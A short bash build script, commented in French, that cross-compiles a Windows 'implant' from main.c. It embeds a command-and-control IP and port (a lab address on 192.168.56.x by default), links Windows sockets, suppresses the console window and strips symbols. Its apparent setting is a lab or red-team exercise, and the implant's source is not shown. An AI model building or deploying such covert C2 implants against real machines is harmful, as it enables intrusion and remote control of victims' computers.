#!/bin/bash
# Script de compilation de l'implant
# Usage: ./build.sh <C2_IP> <C2_PORT>
# Exemple: ./build.sh 192.168.56.104 4444

C2_IP=${1:-"192.168.56.104"}
C2_PORT=${2:-4444}

echo "[*] Compilation de l'implant..."
echo "[*] C2 IP: $C2_IP"
echo "[*] C2 Port: $C2_PORT"

# Cross-compile depuis Linux pour Windows
x86_64-w64-mingw32-gcc \
    -o implant.exe \
    main.c \
    -DCLIENT_IP=\"$C2_IP\" \
    -DCLIENT_PORT=$C2_PORT \
    -DWAIT_FOR_CLIENT \
    -lws2_32 \
    -mwindows \
    -static \
    -s

if [ $? -eq 0 ]; then
    echo "[+] Compilation réussie: implant.exe"
    ls -lh implant.exe
else
    echo "[-] Echec de la compilation"
fi
